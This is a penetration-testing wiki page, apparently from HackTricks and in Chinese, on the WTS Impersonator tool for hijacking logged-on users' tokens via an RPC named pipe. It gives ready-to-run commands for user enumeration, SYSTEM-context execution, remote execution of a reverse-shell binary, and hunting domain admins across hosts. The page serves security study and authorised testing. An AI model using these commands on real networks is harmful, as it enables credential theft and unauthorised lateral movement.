{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC 命名管道，悄无声息地枚举已登录用户并劫持他们的令牌，从而绕过传统的令牌模拟技术。这种方法促进了网络内的无缝横向移动。这项技术的创新归功于 **Omri Baso，他的工作可以在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上找到**。

### 核心功能

该工具通过一系列 API 调用进行操作：
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 关键模块和用法

- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用适用于这两种情况的命令：

- 本地：
```bash
.\WTSImpersonator.exe -m enum
```
- 远程，通过指定 IP 地址或主机名：
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **执行命令**：`exec` 和 `exec-remote` 模块需要 **服务** 上下文才能工作。本地执行只需 WTSImpersonator 可执行文件和一个命令：

- 本地命令执行示例：
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe 可用于获取服务上下文：
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **远程命令执行**：涉及创建和安装一个远程服务，类似于 PsExec.exe，允许以适当的权限执行。

- 远程执行示例：
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **用户猎杀模块**：针对多个机器上的特定用户，在他们的凭据下执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员特别有用。
- 用法示例：
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
